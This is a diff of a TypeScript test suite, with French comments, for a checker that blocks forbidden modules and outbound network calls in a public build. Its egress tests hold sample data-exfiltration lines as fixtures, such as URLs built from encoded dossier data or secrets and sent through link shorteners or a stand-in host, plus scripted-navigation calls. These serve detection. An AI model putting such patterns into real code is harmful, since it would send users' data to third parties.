@@ -92,6 +92,26 @@ describe('findForbiddenModules', () => {
     expect(hits.map((h) => h.rule.label)).toEqual(['@sentry/*', 'src/lib/sentry.ts'])
   })
 
+  it("refuse ce qui appartient à l'offre complète : cycle de vie, relances, correspondance", () => {
+    const hits = findForbiddenModules([
+      `${ROOT}/src/features/workspace/RoadmapPage.tsx`,
+      `${ROOT}/src/features/reminders/RemindersPage.tsx`,
+      `${ROOT}/src/features/correspondence/CorrespondenceInboxPage.tsx`,
+    ])
+    expect(hits).toHaveLength(3)
+  })
+
+  it('laisse passer roadmap-data.ts, qui porte les agences et les langues officielles', () => {
+    // `agencyFor` / `officialLanguage` servent au MONTAGE du dossier : interdire le fichier de
+    // données au motif qu'il s'appelle « roadmap » casserait la réutilisation recherchée.
+    const hits = findForbiddenModules([
+      `${ROOT}/src/features/workspace/roadmap-data.ts`,
+      `${ROOT}/src/features/workspace/module1-tree.ts`,
+      `${ROOT}/src/features/workspace/ctd-full-outline.ts`,
+    ])
+    expect(hits).toEqual([])
+  })
+
   it("refuse l'authentification et la console d'administration", () => {
     const hits = findForbiddenModules([
       `${ROOT}/src/features/auth/AuthProvider.tsx`,
@@ -100,12 +120,25 @@ describe('findForbiddenModules', () => {
     expect(hits).toHaveLength(2)
   })
 
-  it('signale la file de remontée serveur', () => {
+  it('refuse la VIDANGE de la file vers le serveur', () => {
+    const hits = findForbiddenModules([`${ROOT}/src/lib/flush-outbox.ts`])
+    expect(hits).toHaveLength(1)
+    expect(hits[0]?.rule.label).toBe('src/lib/flush-outbox.ts')
+  })
+
+  it('laisse passer la file elle-même, qui est purement LOCALE', () => {
+    // `src/lib/outbox.ts` n'importe que Dexie et ne fait aucun appel réseau — vérifié.
+    // L'interdire bloquait `dossier-repository`, `catalogue/repository` et
+    // `dossier-attachments-repository`, donc tout le socle que le builder doit RÉUTILISER.
+    // Ce qui compte est ce qu'un module FAIT, pas ce que son nom évoque.
     const hits = findForbiddenModules([
       `${ROOT}/src/lib/outbox.ts`,
-      `${ROOT}/src/lib/flush-outbox.ts`,
+      `${ROOT}/src/lib/db.ts`,
+      `${ROOT}/src/lib/audit.ts`,
+      `${ROOT}/src/features/catalogue/repository.ts`,
+      `${ROOT}/src/features/workspace/dossier-repository.ts`,
     ])
-    expect(hits).toHaveLength(2)
+    expect(hits).toEqual([])
   })
 })
 
@@ -141,6 +174,56 @@ describe('findEgress', () => {
     expect(hits[0]?.file).toBe('assets/probe.worker-abc.js')
   })
 
+  it('laisse passer les deux liens de documentation émis par Dexie', () => {
+    // Ils entrent avec le socle de données au lot B1. Ce sont des littéraux de message
+    // d'exception (`dexie.js` l. 381 et 4749) : aucun code ne les déréférence.
+    const hits = findEgress([
+      {
+        file: 'assets/index.js',
+        code: 'e="IndexedDB API missing. Please visit https://tinyurl.com/y2uuvskb";f="Transaction committed too early. See http://bit.ly/2kdckMn"',
+      },
+    ])
+    expect(hits).toEqual([])
+  })
+
+  it("n'ouvre PAS le raccourcisseur : une autre cible du même domaine reste refusée", () => {
+    // LE test qui compte. Autoriser `tinyurl.com/*` aurait laissé un tiers choisir la destination,
+    // aujourd'hui ou demain. La tolérance est une meurtrière, pas une porte — et elle doit le
+    // rester même quand quelqu'un « simplifiera » la règle en pattern de domaine.
+    const hits = findEgress([
+      { file: 'a.js', code: 'x="https://tinyurl.com/autre-chose"' },
+      { file: 'b.js', code: 'y="http://bit.ly/exfiltration"' },
+      // Même identifiant, autre domaine : la règle est ancrée, pas cherchée en sous-chaîne.
+      { file: 'c.js', code: 'z="https://mechant.example/y2uuvskb"' },
+    ])
+    expect(hits).toHaveLength(3)
+  })
+
+  it('refuse une URL autorisée AUGMENTÉE d’une query ou d’un fragment', () => {
+    // La brèche que ce test verrouille, trouvée en revue et bien réelle : l'extracteur d'URL
+    // s'arrêtait au `?`, donc l'ancre `$` d'une entrée « exacte » portait sur une URL TRONQUÉE.
+    // `https://tinyurl.com/y2uuvskb?d=<dossier>` était déclaré conforme — et comme la CSP ne
+    // couvre pas la navigation de premier niveau, le dossier sortait pour de bon.
+    const hits = findEgress([
+      { file: 'a.js', code: 'location.href="https://tinyurl.com/y2uuvskb?d="+btoa(dossier)' },
+      { file: 'b.js', code: 'a.href="https://tinyurl.com/y2uuvskb#"+secret' },
+      { file: 'c.js', code: 'location.href="http://bit.ly/2kdckMn?x="+data' },
+      // Vaut pour TOUTE entrée de la liste, pas seulement les raccourcisseurs.
+      { file: 'd.js', code: 'x="https://react.dev/errors/?fuite="+d' },
+    ])
+    expect(hits).toHaveLength(4)
+    expect(hits[0]?.evidence).toContain('?d=')
+  })
+
+  it('refuse la navigation scriptée, que la CSP ne couvre pas', () => {
+    const hits = findEgress([
+      { file: 'a.js', code: 'location.assign(u)' },
+      { file: 'b.js', code: 'location.replace(u)' },
+      { file: 'c.js', code: 'window.open(u)' },
+    ])
+    expect(hits).toHaveLength(3)
+  })
+
   it('refuse les primitives de sortie, que la minification ne renomme pas', () => {
     const hits = findEgress([
       { file: 'a.js', code: 'navigator.sendBeacon(u,d)' },
@@ -171,6 +254,6 @@ describe('formatIsolationFailure', () => {
     const message = formatIsolationFailure(hits)
     expect(message).toContain('src/lib/supabase.ts')
     expect(message).toContain('singleton du client Supabase')
-    expect(message).toContain('public-builder/_headers')
+    expect(message).toContain('web/public-builder/_headers')
   })
 })
